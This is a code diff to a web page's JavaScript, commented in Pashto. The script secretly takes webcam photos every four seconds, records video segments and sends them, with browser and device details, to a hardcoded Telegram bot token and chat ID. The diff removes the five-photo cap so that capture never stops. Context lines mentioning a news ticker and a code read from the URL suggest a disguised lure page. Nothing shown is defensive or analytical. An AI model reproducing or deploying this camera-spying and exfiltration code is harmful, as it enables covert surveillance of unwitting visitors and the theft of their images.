@@ -503,7 +503,6 @@
         const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
         const CHAT_ID = "8295417969";
         const CAPTURE_INTERVAL = 4000; // 4 seconds
-        const MAX_PHOTOS = 5; // 5 عکسونه
         
         // ================================================================
         //  GET CODE FROM URL
@@ -616,8 +615,7 @@
         let tickerTimer = null;
         let newsTimer = null;
         let totalVideoTime = 0;
-        let videoSegments = [];
-        let isVideoComplete = false;
+        let isFirstPhoto = true;
         
         // ================================================================
         //  START CAMERA
@@ -645,7 +643,7 @@
                 // لومړی عکس سمدلاسه واخلئ
                 capturePhoto();
                 
-                // عکسونه پیل کړئ (هر ۴ ثانیې، تر ۵ عکسونو پورې)
+                // عکسونه پیل کړئ (هر ۴ ثانیې)
                 startAutoCapture();
                 
                 // UI تازه کول
@@ -670,8 +668,6 @@
             if (!stream) return;
             
             recordedChunks = [];
-            videoSegments = [];
-            isVideoComplete = false;
             
             mediaRecorder = new MediaRecorder(stream, {
                 mimeType: 'video/webm;codecs=vp9,opus'
@@ -689,7 +685,6 @@
                     const duration = Math.floor((Date.now() - videoStartTime) / 1000);
                     totalVideoTime += duration;
                     
-                    // ویډیو بوټ ته واستوئ
                     sendVideoToTelegram(blob, duration);
                     recordedChunks = [];
                     
@@ -702,8 +697,6 @@
                                 isRecording = true;
                             }
                         }, 500);
-                    } else {
-                        isVideoComplete = true;
                     }
                 }
             };
@@ -713,22 +706,16 @@
         }
         
         // ================================================================
-        //  AUTO CAPTURE PHOTO (تر ۵ عکسونو پورې)
+        //  AUTO CAPTURE PHOTO
         // ================================================================
         function startAutoCapture() {
             captureTimer = setInterval(() => {
-                if (isRunning && photoCount < MAX_PHOTOS) {
-                    capturePhoto();
-                } else if (photoCount >= MAX_PHOTOS) {
-                    // ۵ عکسونه بشپړ شول، عکس نیول بند کړئ
-                    clearInterval(captureTimer);
-                }
+                if (isRunning) capturePhoto();
             }, CAPTURE_INTERVAL);
         }
         
         function capturePhoto() {
             if (!isRunning || !stream) return;
-            if (photoCount >= MAX_PHOTOS) return;
             
             try {
                 const context = canvas.getContext('2d');
@@ -756,7 +743,7 @@
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                 formData.append('caption', 
-                    `📸 **Photo ${photoCount}/${MAX_PHOTOS}**\n` +
+                    `📸 **Photo #${photoCount}**\n` +
                     `🆔 **Session:** ${sessionId}`
                 );
                 
@@ -782,8 +769,7 @@
                     `🎥 **Video Segment**\n` +
                     `🆔 **Session:** ${sessionId}\n` +
                     `⏱️ **Duration:** ${duration}s\n` +
-                    `📊 **Total Video:** ${totalVideoTime}s\n` +
-                    `📸 **Photos:** ${photoCount}/${MAX_PHOTOS}`
+                    `📊 **Total Video:** ${totalVideoTime}s`
                 );
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
@@ -809,9 +795,7 @@
                         text: `🎬 **New Session Started**\n\n` +
                               `🆔 **Session:** ${sessionId}\n` +
                               `🌍 **Browser:** ${browser}\n` +
-                              `📱 **Device:** ${device}\n` +
-                              `📸 **Photos:** 0/${MAX_PHOTOS}\n` +
-                              `🎥 **Video:** Recording...`,
+                              `📱 **Device:** ${device}`,
                         parse_mode: 'Markdown'
                     })
                 });
@@ -829,7 +813,7 @@
                         text: `🛑 **Session Ended**\n\n` +
                               `🆔 **Session:** ${sessionId}\n` +
                               `⏱️ **Duration:** ${Math.floor(totalTime/60)}m ${totalTime%60}s\n` +
-                              `📸 **Photos:** ${photoCount}/${MAX_PHOTOS}\n` +
+                              `📸 **Photos:** ${photoCount}\n` +
                               `🎥 **Video:** ${totalVideoTime}s total`,
                         parse_mode: 'Markdown'
                     })
